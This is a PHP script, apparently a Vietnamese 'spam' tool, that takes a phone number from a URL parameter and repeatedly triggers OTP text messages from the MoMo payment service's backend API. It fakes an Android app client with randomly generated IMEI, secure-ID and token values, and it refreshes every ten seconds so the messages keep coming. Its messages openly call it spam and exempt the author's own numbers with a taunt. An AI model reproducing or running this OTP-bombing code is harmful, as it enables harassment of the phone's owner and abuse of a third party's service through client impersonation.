<?php
echo header("refresh: 10");
header('content-type: application/json');
$sdt = $_GET["sdt"];
if(!$sdt){
$error1 = [
		"status" => "error",
		"messenger" => "Vui Lòng Nhập Số Điện Thoại Cần Spam",
		];
	$hienerror1 = json_encode($error1, JSON_FORCE_OBJECT | JSON_PRETTY_PRINT);
	echo $hienerror1;
} else if (strlen($sdt) < 10) {
$error2 = [
    "code" => "503",
		"status" => "error",
		"messenger" => "Vui Lòng Nhập Đúng Định Dạng Số Điện Thoại",
		];
	$hienerror2 = json_encode($error2, JSON_FORCE_OBJECT | JSON_PRETTY_PRINT);
	echo $hienerror2;
} else if($sdt == "058024068" or $sdt == "0562736654"){
	$error3 = [
		"status" => "error",
		"messenger" => "Đang Làm Gì Đó , Spam Đéo Được Tao Đâu Nhóc",
		];
	$hienerror3 = json_encode($error3, JSON_FORCE_OBJECT | JSON_PRETTY_PRINT);
	echo $hienerror3;
} else {
	$momo = (new Momo)->SendOTP($sdt);
	

print_r($momo);

	
}

class Momo
{
	private $config = array();
   private $URLAction = array(
        "CHECK_USER_BE_MSG" => "https://api.momo.vn/backend/auth-app/public/CHECK_USER_BE_MSG", //Check người dùng
        "SEND_OTP_MSG"      => "https://api.momo.vn/backend/otp-app/public/", //Gửi OTP
        "REG_DEVICE_MSG"    => "https://api.momo.vn/backend/otp-app/public/", // Xác minh OTP
    );
    public $momo_data_config = array(
        "appVer" => 40122,
        "appCode" => "4.0.12",
  );
	public function __construct() {
		$this->config["imei"] = $this->generateImei();
		$this->config["SECUREID"] = $this->get_SECUREID();
		$this->config["TOKEN"] = $this->get_TOKEN();
		$this->config["rkey"] = $this->generateRandom(20);
		$this->config["aaid"] = $this->generateImei();
	}
	public function SendOTP($sdt) {
		$this->CHECK_USER_BE_MSG($sdt);
		$result = $this->SEND_OTP_MSG($sdt);
		if(is_null($result)){
			return array(
				"status" => "error",
				"errorCode"	 => -5,
				"errorDesc"=> "Hết thời gian truy cập vui lòng đăng nhập lại"
			);
		} else {
			return $result;
		}
	}
	public function SEND_OTP_MSG($sdt) {
		$imei = $this->config["imei"];
		$sec = $this->config["SECUREID"];
		$token = $this->config["TOKEN"];
		$rkey = $this->config["rkey"];
		$aaid = $this->config["aaid"];
		$header = array(
			"agent_id: undefined",
			"sessionkey:",
			"user_phone: undefined",
			"authorization: Bearer undefined",
			"msgtype: SEND_OTP_MSG",
			"Host: api.momo.vn",
			"User-Agent: okhttp/4.0.12",
			"app_version: ".$this->momo_data_config["appVer"],
			"app_code: ".$this->momo_data_config["appCode"],
			"device_os: ANDROID"
		);
		$microtime = $this->get_microtime();
		$Data = array (
			'user' => $sdt,
			'msgType' => 'SEND_OTP_MSG',
			'cmdId' => (string) $microtime. '000000',
			'lang' => 'vi',
			'time' => $microtime,
			'channel' => 'APP',
			'appVer' => $this->momo_data_config["appVer"],
			'appCode' => $this->momo_data_config["appCode"],
			'deviceOS' => 'ANDROID',
			'buildNumber' => 0,
			'appId' => 'vn.momo.platform',
			'result' => true,
			'errorCode' => 0,
			'errorDesc' => '',
			'momoMsg' => 
			array (
				'_class' => 'mservice.backend.entity.msg.RegDeviceMsg',
				'number' => $sdt,
				'imei' => $imei,
				'cname' => 'Vietnam',
				'ccode' => '084',
				'device' => "Oppo realme X Lite",
				'firmware' => '23',
				'hardware' => "RMX1851CN",
				'manufacture' => "Oppo",
				'csp' => '',
				'icc' => '',
				'mcc' => '452',
				'device_os' => 'Android',
				'secure_id' => $sec,
			),
			'extra' => 
			array (
				'action' => 'SEND',
				'rkey' => $rkey,
				'AAID' => $aaid,
				'IDFA' => '',
				'TOKEN' => $token,
				'SIMULATOR' => '',
				'SECUREID' => $sec,
				'MODELID' => "Oppo RMX1851",
				'isVoice' => false,
				'REQUIRE_HASH_STRING_OTP' => true,
				'checkSum' => '',
			),
		);
		return $this->CURL("SEND_OTP_MSG",$header,$Data);
	}
	public function CHECK_USER_BE_MSG($sdt) {
		$imei = $this->config["imei"];
		$sec = $this->config["SECUREID"];
		$token = $this->config["TOKEN"];
		$rkey = $this->config["rkey"];
		$aaid = $this->config["imei"];
		$microtime = $this->get_microtime();
		$header = array(
			"agent_id: undefined",
			"sessionkey:",
			"user_phone: undefined",
			"authorization: Bearer undefined",
			"msgtype: CHECK_USER_BE_MSG",
			"Host: api.momo.vn",
			"User-Agent: okhttp/4.0.12",
			"app_version: ".$this->momo_data_config["appVer"],
			"app_code: ".$this->momo_data_config["appCode"],
			"device_os: ANDROID"
		);
		$Data = array (
			'user' => $sdt,
			'msgType' => 'CHECK_USER_BE_MSG',
			'cmdId' => (string) $microtime. '000000',
			'lang' => 'vi',
			'time' => $microtime,
			'channel' => 'APP',
			'appVer' => $this->momo_data_config["appVer"],
			'appCode' => $this->momo_data_config["appCode"],
			'deviceOS' => 'ANDROID',
			'buildNumber' => 0,
			'appId' => 'vn.momo.platform',
			'result' => true,
			'errorCode' => 0,
			'errorDesc' => '',
			'momoMsg' => 
			array (
				'_class' => 'mservice.backend.entity.msg.RegDeviceMsg',
				'number' => $sdt,
				'imei' => $imei,
				'cname' => 'Vietnam',
				'ccode' => '084',
				'device' => "Oppo realme X Lite",
				'firmware' => '23',
				'hardware' => "RMX1851CN",
				'manufacture' => "Oppo",
				'csp' => '',
				'icc' => '',
				'mcc' => '452',
				'device_os' => 'Android',
				'secure_id' => $sec,
			),
			'extra' => 
			array (
					'checkSum' => '',
			),
		);
		return $this->CURL("CHECK_USER_BE_MSG",$header,$Data);
	}
	private function get_TOKEN() {
		return $this->generateRandom(22).':'.$this->generateRandom(9).'-'.$this->generateRandom(20).'-'.$this->generateRandom(12).'-'.$this->generateRandom(7).'-'.$this->generateRandom(7).'-'.$this->generateRandom(53).'-'.$this->generateRandom(9).'_'.$this->generateRandom(11).'-'.$this->generateRandom(4);
	}
	private function CURL($Action, $header, $data) {
		$Data = is_array($data) ? json_encode($data) : $data;
		$curl = curl_init();
		$header[] = 'Content-Type: application/json';
		$header[] = 'accept: application/json';
		$header[] = 'Content-Length: '.strlen($Data);
		$opt = array(
			CURLOPT_URL =>$this->URLAction[$Action],
			CURLOPT_RETURNTRANSFER => TRUE,
			CURLOPT_POST => empty($data) ? FALSE : TRUE,
			CURLOPT_POSTFIELDS => $Data,
			CURLOPT_CUSTOMREQUEST => empty($data) ? 'GET' : 'POST',
			CURLOPT_HTTPHEADER => $header,
			CURLOPT_ENCODING => "",
			CURLOPT_HEADER => FALSE,
			CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
			CURLOPT_TIMEOUT => 30,
		);
		curl_setopt_array($curl,$opt);
		$body = curl_exec($curl);
		if (is_array(json_decode($body, true))) {
			return json_decode($body, true);
		} else {
			return $body;
		}
	}
	private function generateRandom($length = 20) {
		$characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
		$charactersLength = strlen($characters);
		$randomString = '';
		for ($i = 0; $i < $length; $i++) {
			$randomString .= $characters[rand(0, $charactersLength - 1)];
		}
		return $randomString;
	}
	private function get_SECUREID($length = 17) {
		$characters = '0123456789abcdef';
		$charactersLength = strlen($characters);
		$randomString = '';
		for ($i = 0; $i < $length; $i++) {
			$randomString .= $characters[rand(0, $charactersLength - 1)];
		}
		return $randomString;
	}
	public function generateImei() {
		return $this->generateRandomString(8) . '-' . $this->generateRandomString(4) . '-' . $this->generateRandomString(4) . '-' . $this->generateRandomString(4) . '-' . $this->generateRandomString(12);
	}
	private function generateRandomString($length = 20) {
		$characters = '0123456789abcdef';
		$charactersLength = strlen($characters);
		$randomString = '';
		for ($i = 0; $i < $length; $i++) {
			$randomString .= $characters[rand(0, $charactersLength - 1)];
		}
		return $randomString;
	}
	private function get_string($data) {
		return str_replace(array('<',"'",'>','?','/',"\\",'--','eval(','<php','-'),array('','','','','','','','','',''),htmlspecialchars(addslashes(strip_tags($data))));
	}
	public function get_microtime() {
		return round(microtime(true) * 1000);
	}
}